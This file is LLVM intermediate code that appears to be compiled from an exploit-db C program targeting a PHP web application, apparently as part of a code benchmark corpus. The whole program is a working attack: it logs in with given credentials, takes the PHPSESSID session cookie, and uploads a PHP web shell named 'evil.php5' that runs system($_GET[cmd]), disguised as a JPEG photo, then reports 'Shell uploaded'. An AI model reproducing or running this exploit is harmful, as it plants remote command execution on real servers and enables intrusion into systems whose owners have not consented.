; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/php/webapps/extr_14176.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/php/webapps/extr_14176.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.option = type { i8*, i32, i32, i32 }

@__const.main.code = private unnamed_addr constant [429 x i8] c"--AaB03x\0D\0AContent-Disposition: form-data; name=\22photo\22; filename=\22evil.php5\22\0D\0AContent-Type: image/jpeg\0D\0A\0D\0A<?php echo \22<pre>\22; system($_GET[cmd]); echo \22</pre>\22?>\0D\0A--AaB03x\0D\0AContent-Disposition: form-data; name=\22Call\22\0D\0A\0D\0Aadd\0D\0A--AaB03x\0D\0AContent-Disposition: form-data; name=\22photoType\22\0D\0A\0D\0AP\0D\0A--AaB03x\0D\0AContent-Disposition: form-data; name=\22image.x\22\0D\0A\0D\0A8\0D\0A--AaB03x\0D\0AContent-Disposition: form-data; name=\22image.y\22\0D\0A\0D\0A5\0D\0A--AaB03x--\0D\0A\00", align 16
@.str = private unnamed_addr constant [5 x i8] c"host\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"port\00", align 1
@.str.2 = private unnamed_addr constant [5 x i8] c"path\00", align 1
@.str.3 = private unnamed_addr constant [9 x i8] c"username\00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"password\00", align 1
@__const.main.long_options = private unnamed_addr constant [6 x %struct.option] [%struct.option { i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i32 1, i32 0, i32 1 }, %struct.option { i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i32 0, i32 0), i32 1, i32 0, i32 2 }, %struct.option { i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i32 0, i32 0), i32 1, i32 0, i32 3 }, %struct.option { i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i32 0, i32 0), i32 1, i32 0, i32 117 }, %struct.option { i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i32 0, i32 0), i32 1, i32 0, i32 112 }, %struct.option zeroinitializer], align 16
@.str.5 = private unnamed_addr constant [5 x i8] c"u:p:\00", align 1
@optarg = common dso_local global i8* null, align 8
@.str.6 = private unnamed_addr constant [20 x i8] c"\0A[*] Connecting...\0A\00", align 1
@.str.7 = private unnamed_addr constant [25 x i8] c"[-] Connection failed!\0A\0A\00", align 1
@.str.8 = private unnamed_addr constant [27 x i8] c"[+] Connected\0A[*] Login...\00", align 1
@.str.9 = private unnamed_addr constant [135 x i8] c"POST %scheck_login.php HTTP/1.1\0D\0AHost: %s\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AContent-Length: %d\0D\0A\0D\0Aemail=%s&password=%s\00", align 1
@.str.10 = private unnamed_addr constant [22 x i8] c"[-] Sending failed!\0A\0A\00", align 1
@.str.11 = private unnamed_addr constant [22 x i8] c"[-] Receive failed!\0A\0A\00", align 1
@.str.12 = private unnamed_addr constant [20 x i8] c"Password is invalid\00", align 1
@.str.13 = private unnamed_addr constant [24 x i8] c"\0A[-] Login Incorrect!\0A\0A\00", align 1
@.str.14 = private unnamed_addr constant [10 x i8] c"PHPSESSID\00", align 1
@.str.15 = private unnamed_addr constant [22 x i8] c"\0A[-] Session error!\0A\0A\00", align 1
@.str.16 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.17 = private unnamed_addr constant [40 x i8] c"\0A[+] Login Successful\0A[*] Uploading...\0A\00", align 1
@.str.18 = private unnamed_addr constant [134 x i8] c"POST %spopups/photos.php HTTP/1.1\0D\0AHost: %s\0D\0ACookie: %s\0D\0AContent-type: multipart/form-data, boundary=AaB03x\0D\0AContent-Length: %d\0D\0A\0D\0A%s\00", align 1
@.str.19 = private unnamed_addr constant [10 x i8] c"evil.php5\00", align 1
@.str.20 = private unnamed_addr constant [22 x i8] c"\0A[-] Upload failed!\0A\0A\00", align 1
@.str.21 = private unnamed_addr constant [43 x i8] c"[+] Shell uploaded\0A[+] Connection closed\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [429 x i8], align 16
  %20 = alloca [6 x %struct.option], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 80, i32* %9, align 4
  store i8* null, i8** %12, align 8
  store i8* null, i8** %13, align 8
  store i8* null, i8** %14, align 8
  store i8* null, i8** %15, align 8
  store i8* null, i8** %16, align 8
  store i8* null, i8** %17, align 8
  store i8* null, i8** %18, align 8
  %21 = bitcast [429 x i8]* %19 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %21, i8* align 16 getelementptr inbounds ([429 x i8], [429 x i8]* @__const.main.code, i32 0, i32 0), i64 429, i1 false)
  %22 = bitcast [6 x %struct.option]* %20 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %22, i8* align 16 bitcast ([6 x %struct.option]* @__const.main.long_options to i8*), i64 144, i1 false)
  %23 = load i32, i32* %4, align 4
  %24 = icmp slt i32 %23, 2
  br i1 %24, label %25, label %30

25:                                               ; preds = %2
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 @usage(i8* %28)
  store i32 -1, i32* %3, align 4
  br label %213

30:                                               ; preds = %2
  br label %31

31:                                               ; preds = %55, %30
  %32 = load i32, i32* %4, align 4
  %33 = load i8**, i8*** %5, align 8
  %34 = getelementptr inbounds [6 x %struct.option], [6 x %struct.option]* %20, i64 0, i64 0
  %35 = call i32 @getopt_long(i32 %32, i8** %33, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0), %struct.option* %34, i32* %8)
  store i32 %35, i32* %7, align 4
  %36 = icmp sgt i32 %35, 0
  br i1 %36, label %37, label %56

37:                                               ; preds = %31
  %38 = load i32, i32* %7, align 4
  switch i32 %38, label %50 [
    i32 1, label %39
    i32 2, label %41
    i32 3, label %44
    i32 117, label %46
    i32 112, label %48
  ]

39:                                               ; preds = %37
  %40 = load i8*, i8** @optarg, align 8
  store i8* %40, i8** %15, align 8
  br label %55

41:                                               ; preds = %37
  %42 = load i8*, i8** @optarg, align 8
  %43 = call i32 @atoi(i8* %42)
  store i32 %43, i32* %9, align 4
  br label %55

44:                                               ; preds = %37
  %45 = load i8*, i8** @optarg, align 8
  store i8* %45, i8** %16, align 8
  br label %55

46:                                               ; preds = %37
  %47 = load i8*, i8** @optarg, align 8
  store i8* %47, i8** %17, align 8
  br label %55

48:                                               ; preds = %37
  %49 = load i8*, i8** @optarg, align 8
  store i8* %49, i8** %18, align 8
  br label %55

50:                                               ; preds = %37
  %51 = load i8**, i8*** %5, align 8
  %52 = getelementptr inbounds i8*, i8** %51, i64 0
  %53 = load i8*, i8** %52, align 8
  %54 = call i32 @usage(i8* %53)
  store i32 -1, i32* %3, align 4
  br label %213

55:                                               ; preds = %48, %46, %44, %41, %39
  br label %31

56:                                               ; preds = %31
  %57 = load i8*, i8** %15, align 8
  %58 = icmp ne i8* %57, null
  br i1 %58, label %59, label %71

59:                                               ; preds = %56
  %60 = load i8*, i8** %16, align 8
  %61 = icmp ne i8* %60, null
  br i1 %61, label %62, label %71

62:                                               ; preds = %59
  %63 = load i8*, i8** %17, align 8
  %64 = icmp ne i8* %63, null
  br i1 %64, label %65, label %71

65:                                               ; preds = %62
  %66 = load i8*, i8** %18, align 8
  %67 = icmp ne i8* %66, null
  br i1 %67, label %68, label %71

68:                                               ; preds = %65
  %69 = load i32, i32* %9, align 4
  %70 = icmp slt i32 %69, 0
  br i1 %70, label %71, label %76

71:                                               ; preds = %68, %65, %62, %59, %56
  %72 = load i8**, i8*** %5, align 8
  %73 = getelementptr inbounds i8*, i8** %72, i64 0
  %74 = load i8*, i8** %73, align 8
  %75 = call i32 @usage(i8* %74)
  store i32 -1, i32* %3, align 4
  br label %213

76:                                               ; preds = %68
  %77 = call i32 @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.6, i64 0, i64 0))
  %78 = load i8*, i8** %15, align 8
  %79 = load i32, i32* %9, align 4
  %80 = call i32 @socket_connect(i8* %78, i32 %79)
  store i32 %80, i32* %6, align 4
  %81 = icmp slt i32 %80, 0
  br i1 %81, label %82, label %86

82:                                               ; preds = %76
  %83 = call i32 @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.7, i64 0, i64 0))
  %84 = load i8*, i8** %12, align 8
  %85 = call i32 @free(i8* %84)
  store i32 -1, i32* %3, align 4
  br label %213

86:                                               ; preds = %76
  %87 = call i32 @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.8, i64 0, i64 0))
  %88 = load i8*, i8** %17, align 8
  %89 = call i32 @strlen(i8* %88)
  %90 = load i8*, i8** %18, align 8
  %91 = call i32 @strlen(i8* %90)
  %92 = add nsw i32 %89, %91
  %93 = add nsw i32 %92, 16
  store i32 %93, i32* %10, align 4
  %94 = load i8*, i8** %16, align 8
  %95 = load i8*, i8** %15, align 8
  %96 = load i32, i32* %10, align 4
  %97 = load i8*, i8** %17, align 8
  %98 = load i8*, i8** %18, align 8
  %99 = call i32 (i8**, i8*, i8*, i8*, ...) @vspr(i8** %12, i8* getelementptr inbounds ([135 x i8], [135 x i8]* @.str.9, i64 0, i64 0), i8* %94, i8* %95, i32 %96, i8* %97, i8* %98)
  store i32 %99, i32* %11, align 4
  %100 = load i32, i32* %6, align 4
  %101 = load i8*, i8** %12, align 8
  %102 = load i32, i32* %11, align 4
  %103 = call i64 @send(i32 %100, i8* %101, i32 %102, i32 0)
  %104 = icmp slt i64 %103, 0
  br i1 %104, label %105, label %111

105:                                              ; preds = %86
  %106 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.10, i64 0, i64 0))
  %107 = load i8*, i8** %12, align 8
  %108 = call i32 @free(i8* %107)
  %109 = load i32, i32* %6, align 4
  %110 = call i32 @close(i32 %109)
  store i32 -1, i32* %3, align 4
  br label %213

111:                                              ; preds = %86
  %112 = load i32, i32* %6, align 4
  %113 = call i8* @socket_receive(i32 %112, i32 0)
  store i8* %113, i8** %13, align 8
  %114 = icmp ne i8* %113, null
  br i1 %114, label %121, label %115

115:                                              ; preds = %111
  %116 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.11, i64 0, i64 0))
  %117 = load i8*, i8** %12, align 8
  %118 = call i32 @free(i8* %117)
  %119 = load i32, i32* %6, align 4
  %120 = call i32 @close(i32 %119)
  store i32 -1, i32* %3, align 4
  br label %213

121:                                              ; preds = %111
  %122 = load i8*, i8** %13, align 8
  %123 = call i8* @strstr(i8* %122, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.12, i64 0, i64 0))
  %124 = icmp ne i8* %123, null
  br i1 %124, label %125, label %131

125:                                              ; preds = %121
  %126 = call i32 @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.13, i64 0, i64 0))
  %127 = load i8*, i8** %12, align 8
  %128 = call i32 @free(i8* %127)
  %129 = load i32, i32* %6, align 4
  %130 = call i32 @close(i32 %129)
  store i32 -1, i32* %3, align 4
  br label %213

131:                                              ; preds = %121
  %132 = load i8*, i8** %13, align 8
  %133 = call i8* @strstr(i8* %132, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i64 0, i64 0))
  store i8* %133, i8** %14, align 8
  %134 = load i8*, i8** %14, align 8
  %135 = icmp ne i8* %134, null
  br i1 %135, label %142, label %136

136:                                              ; preds = %131
  %137 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.15, i64 0, i64 0))
  %138 = load i8*, i8** %12, align 8
  %139 = call i32 @free(i8* %138)
  %140 = load i32, i32* %6, align 4
  %141 = call i32 @close(i32 %140)
  store i32 -1, i32* %3, align 4
  br label %213

142:                                              ; preds = %131
  %143 = load i8*, i8** %14, align 8
  %144 = call i8* @strtok(i8* %143, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i64 0, i64 0))
  store i8* %144, i8** %14, align 8
  %145 = load i8*, i8** %14, align 8
  %146 = icmp ne i8* %145, null
  br i1 %146, label %153, label %147

147:                                              ; preds = %142
  %148 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.15, i64 0, i64 0))
  %149 = load i8*, i8** %12, align 8
  %150 = call i32 @free(i8* %149)
  %151 = load i32, i32* %6, align 4
  %152 = call i32 @close(i32 %151)
  store i32 -1, i32* %3, align 4
  br label %213

153:                                              ; preds = %142
  %154 = call i32 @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.17, i64 0, i64 0))
  %155 = load i32, i32* %6, align 4
  %156 = call i32 @close(i32 %155)
  %157 = load i8*, i8** %15, align 8
  %158 = load i32, i32* %9, align 4
  %159 = call i32 @socket_connect(i8* %157, i32 %158)
  store i32 %159, i32* %6, align 4
  %160 = icmp slt i32 %159, 0
  br i1 %160, label %161, label %165

161:                                              ; preds = %153
  %162 = call i32 @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.7, i64 0, i64 0))
  %163 = load i8*, i8** %12, align 8
  %164 = call i32 @free(i8* %163)
  store i32 -1, i32* %3, align 4
  br label %213

165:                                              ; preds = %153
  %166 = load i8*, i8** %12, align 8
  %167 = call i32 @free(i8* %166)
  %168 = getelementptr inbounds [429 x i8], [429 x i8]* %19, i64 0, i64 0
  %169 = call i32 @strlen(i8* %168)
  store i32 %169, i32* %10, align 4
  %170 = load i8*, i8** %16, align 8
  %171 = load i8*, i8** %15, align 8
  %172 = load i8*, i8** %14, align 8
  %173 = load i32, i32* %10, align 4
  %174 = getelementptr inbounds [429 x i8], [429 x i8]* %19, i64 0, i64 0
  %175 = call i32 (i8**, i8*, i8*, i8*, ...) @vspr(i8** %12, i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.18, i64 0, i64 0), i8* %170, i8* %171, i8* %172, i32 %173, i8* %174)
  store i32 %175, i32* %11, align 4
  %176 = load i32, i32* %6, align 4
  %177 = load i8*, i8** %12, align 8
  %178 = load i32, i32* %11, align 4
  %179 = call i64 @send(i32 %176, i8* %177, i32 %178, i32 0)
  %180 = icmp slt i64 %179, 0
  br i1 %180, label %181, label %187

181:                                              ; preds = %165
  %182 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.10, i64 0, i64 0))
  %183 = load i8*, i8** %12, align 8
  %184 = call i32 @free(i8* %183)
  %185 = load i32, i32* %6, align 4
  %186 = call i32 @close(i32 %185)
  store i32 -1, i32* %3, align 4
  br label %213

187:                                              ; preds = %165
  %188 = load i32, i32* %6, align 4
  %189 = call i8* @socket_receive(i32 %188, i32 3)
  store i8* %189, i8** %13, align 8
  %190 = icmp ne i8* %189, null
  br i1 %190, label %197, label %191

191:                                              ; preds = %187
  %192 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.11, i64 0, i64 0))
  %193 = load i8*, i8** %12, align 8
  %194 = call i32 @free(i8* %193)
  %195 = load i32, i32* %6, align 4
  %196 = call i32 @close(i32 %195)
  store i32 -1, i32* %3, align 4
  br label %213

197:                                              ; preds = %187
  %198 = load i8*, i8** %13, align 8
  %199 = call i8* @strstr(i8* %198, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.19, i64 0, i64 0))
  %200 = icmp ne i8* %199, null
  br i1 %200, label %207, label %201

201:                                              ; preds = %197
  %202 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.20, i64 0, i64 0))
  %203 = load i8*, i8** %12, align 8
  %204 = call i32 @free(i8* %203)
  %205 = load i32, i32* %6, align 4
  %206 = call i32 @close(i32 %205)
  store i32 -1, i32* %3, align 4
  br label %213

207:                                              ; preds = %197
  %208 = load i8*, i8** %12, align 8
  %209 = call i32 @free(i8* %208)
  %210 = load i32, i32* %6, align 4
  %211 = call i32 @close(i32 %210)
  %212 = call i32 @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.21, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %213

213:                                              ; preds = %207, %201, %191, %181, %161, %147, %136, %125, %115, %105, %82, %71, %50, %25
  %214 = load i32, i32* %3, align 4
  ret i32 %214
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @usage(i8*) #2

declare dso_local i32 @getopt_long(i32, i8**, i8*, %struct.option*, i32*) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @printf(i8*) #2

declare dso_local i32 @socket_connect(i8*, i32) #2

declare dso_local i32 @free(i8*) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @vspr(i8**, i8*, i8*, i8*, ...) #2

declare dso_local i64 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @close(i32) #2

declare dso_local i8* @socket_receive(i32, i32) #2

declare dso_local i8* @strstr(i8*, i8*) #2

declare dso_local i8* @strtok(i8*, i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
